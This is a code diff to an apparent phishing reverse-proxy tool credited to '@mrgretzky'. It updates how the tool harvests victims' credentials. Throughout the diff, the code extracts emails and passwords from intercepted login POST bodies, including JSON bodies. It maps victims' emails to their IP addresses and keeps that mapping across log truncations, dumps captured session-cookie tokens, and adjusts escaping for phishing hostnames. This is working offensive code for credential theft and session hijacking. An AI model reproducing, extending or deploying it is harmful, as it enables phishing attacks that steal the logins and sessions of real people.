@@ -28,7 +28,7 @@ import sys
 import subprocess
 import base64
 
-VERSION = 'v.1.0'
+VERSION = 'v.1.0.1'
 
 EOL = '\n'
 TAB = '\t'
@@ -199,65 +199,89 @@ def parse_line(cfg, cur_email, line):
 
     remote_addr = cur_email = cur_passwd = token_data = user_agent = ''
 
-    line = fix_line(line)
+    if line[:2] == '> ': # leftover data from previous parsing
+        data = line.split()
+        if len(data) >= 3:
+            d_name = data[1]
+            if d_name == "email_ip" and len(data) == 4:
+                d_ip = data[2]
+                d_email = data[3]
+                cur_email = d_email
+                email_by_ips[d_ip] = d_email
+    else:
+        line = fix_line(line)
+        try:
+            req = json.loads(line)
 
-    try:
-        req = json.loads(line)
+            email_arg = passwd_arg = email_arg_re = passwd_arg_re = email_arg_re_name = passwd_arg_re_name = email_json_arg = passwd_json_arg = ''
 
-        email_arg = passwd_arg = email_arg_re = passwd_arg_re = email_arg_re_name = passwd_arg_re_name = ''
+            if cfg.has_option('creds', 'email_arg'):
+                email_arg = cfg.get('creds', 'email_arg').strip()
+            if cfg.has_option('creds', 'passwd_arg'):
+                passwd_arg = cfg.get('creds', 'passwd_arg').strip()
+            if cfg.has_option('creds', 'email_arg_re'):
+                email_arg_re = cfg.get('creds', 'email_arg_re').strip()
+                si = email_arg_re.find(':=')
+                if si > -1:
+                    email_arg_re_name = email_arg_re[:si]
+                    email_arg_re_pattern = email_arg_re[si+2:]
+            if cfg.has_option('creds', 'passwd_arg_re'):
+                passwd_arg_re = cfg.get('creds', 'passwd_arg_re').strip()
+                si = passwd_arg_re.find(':=')
+                if si > -1:
+                    passwd_arg_re_name = passwd_arg_re[:si]
+                    passwd_arg_re_pattern = passwd_arg_re[si+2:]
+            if cfg.has_option('creds', 'email_json_arg'):
+                email_json_arg = cfg.get('creds', 'email_json_arg').strip()
+            if cfg.has_option('creds', 'passwd_json_arg'):
+                passwd_json_arg = cfg.get('creds', 'passwd_json_arg').strip()
 
-        if cfg.has_option('creds', 'email_arg'):
-            email_arg = cfg.get('creds', 'email_arg').strip()
-        if cfg.has_option('creds', 'passwd_arg'):
-            passwd_arg = cfg.get('creds', 'passwd_arg').strip()
-        if cfg.has_option('creds', 'email_arg_re'):
-            email_arg_re = cfg.get('creds', 'email_arg_re').strip()
-            si = email_arg_re.find(':=')
-            if si > -1:
-                email_arg_re_name = email_arg_re[:si]
-                email_arg_re_pattern = email_arg_re[si+2:]
-        if cfg.has_option('creds', 'passwd_arg_re'):
-            passwd_arg_re = cfg.get('creds', 'passwd_arg_re').strip()
-            si = passwd_arg_re.find(':=')
-            if si > -1:
-                passwd_arg_re_name = passwd_arg_re[:si]
-                passwd_arg_re_pattern = passwd_arg_re[si+2:]
+            remote_addr = req['remote_addr']
+            user_agent = req['ua']
+            post_args = get_post_args(req['body'])
+            tokens = get_token_names(cfg.get('creds', 'tokens'))
+            token_domains = get_token_domains(cfg.get('creds', 'tokens'))
+            set_cookies = get_set_cookies(req['set-cookies'])
+            try:
+                post_json = json.loads(req['body'])
+            except:
+                post_json = None
+            
 
-        remote_addr = req['remote_addr']
-        user_agent = req['ua']
-        post_args = get_post_args(req['body'])
-        tokens = get_token_names(cfg.get('creds', 'tokens'))
-        token_domains = get_token_domains(cfg.get('creds', 'tokens'))
-        set_cookies = get_set_cookies(req['set-cookies'])
+            cur_email = ''
+            cur_passwd = ''
+            token_data = ''
 
-        cur_email = ''
-        cur_passwd = ''
-        token_data = ''
-
-        if email_arg != '' and email_arg in post_args:
-            cur_email = urllib.unquote(post_args[email_arg]).decode('utf8')
-            email_by_ips[req['remote_addr']] = cur_email
-        if passwd_arg != '' and passwd_arg in post_args:
-            cur_passwd = urllib.unquote(post_args[passwd_arg]).decode('utf8')
-            passwd_by_ips[req['remote_addr']] = cur_passwd
-        if email_arg_re_name != '' and email_arg_re_pattern != '' and email_arg_re_name in post_args:
-            post_arg = urllib.unquote(post_args[email_arg_re_name]).decode('utf8')
-            rxp = re.search(email_arg_re_pattern, post_arg)
-            if rxp:
-                cur_email = rxp.group(1)
+            if email_arg != '' and email_arg in post_args:
+                cur_email = urllib.unquote(post_args[email_arg]).decode('utf8')
                 email_by_ips[req['remote_addr']] = cur_email
-        if passwd_arg_re_name != '' and passwd_arg_re_pattern != '' and passwd_arg_re_name in post_args:
-            post_arg = urllib.unquote(post_args[passwd_arg_re_name]).decode('utf8')
-            rxp = re.search(passwd_arg_re_pattern, post_arg)
-            if rxp:
-                cur_passwd = rxp.group(1)
+            if passwd_arg != '' and passwd_arg in post_args:
+                cur_passwd = urllib.unquote(post_args[passwd_arg]).decode('utf8')
                 passwd_by_ips[req['remote_addr']] = cur_passwd
+            if email_arg_re_name != '' and email_arg_re_pattern != '' and email_arg_re_name in post_args:
+                post_arg = urllib.unquote(post_args[email_arg_re_name]).decode('utf8')
+                rxp = re.search(email_arg_re_pattern, post_arg)
+                if rxp:
+                    cur_email = rxp.group(1)
+                    email_by_ips[req['remote_addr']] = cur_email
+            if passwd_arg_re_name != '' and passwd_arg_re_pattern != '' and passwd_arg_re_name in post_args:
+                post_arg = urllib.unquote(post_args[passwd_arg_re_name]).decode('utf8')
+                rxp = re.search(passwd_arg_re_pattern, post_arg)
+                if rxp:
+                    cur_passwd = rxp.group(1)
+                    passwd_by_ips[req['remote_addr']] = cur_passwd
+            if email_json_arg != '' and post_json != None and email_json_arg in post_json:
+                cur_email = urllib.unquote(post_json[email_json_arg]).decode('utf8')
+                email_by_ips[req['remote_addr']] = cur_email
+            if passwd_json_arg != '' and post_json != None and passwd_json_arg in post_json:
+                cur_passwd = urllib.unquote(post_json[passwd_json_arg]).decode('utf8')
+                passwd_by_ips[req['remote_addr']] = cur_passwd        
 
-        if tokens_ready(set_cookies, tokens):
-            token_data = dump_tokens(set_cookies, tokens, token_domains)
-    except:
-        print '[-] exception:', line
-        pass
+            if tokens_ready(set_cookies, tokens):
+                token_data = dump_tokens(set_cookies, tokens, token_domains)
+        except:
+            print '[-] exception:', line
+            pass
 
     return remote_addr, user_agent, cur_email, cur_passwd, token_data
 
@@ -279,7 +303,7 @@ def config_site(cfg, cfg_path, domain, do_enable):
                 phish_hostnames.append(phish_host)
                 phish_hostname_esc = ''
                 for c in phish_host:
-                    if not c.isalpha():
+                    if not c.isalpha() and not c.isdigit():
                         phish_hostname_esc += '%'
                     phish_hostname_esc += c
                 phish_hostnames_esc.append(phish_hostname_esc)
@@ -287,7 +311,7 @@ def config_site(cfg, cfg_path, domain, do_enable):
             phish_hostnames.append(domain)
             phish_hostname_esc = ''
             for c in domain:
-                if not c.isalpha():
+                if not c.isalpha() and not c.isdigit():
                     phish_hostname_esc += '%'
                 phish_hostname_esc += c
             phish_hostnames_esc.append(phish_hostname_esc)
@@ -394,7 +418,7 @@ def banner():
     print '|  __/\\ V /| | | (_| | | | | |>  < '
     print ' \\___| \\_/ |_|_|\\__, |_|_| |_/_/\\_\\'
     print '                 __/ |             '
-    print ' by @mrgretzky  |___/         ' + VERSION
+    print ' by @mrgretzky  |___/       ' + VERSION
     print ''
 
 def parser_main(args):
@@ -472,6 +496,9 @@ def parser_main(args):
                                         logn += 1
                         if not args.debug:
                             f.truncate(0)
+                            f.seek(0)
+                            for d_ip, d_email in email_by_ips.iteritems():
+                                f.write('> email_ip ' + d_ip + ' ' + d_email + EOL)
                         else:
                             print '[*] Debug mode on. Log was not truncated!'
                 else:
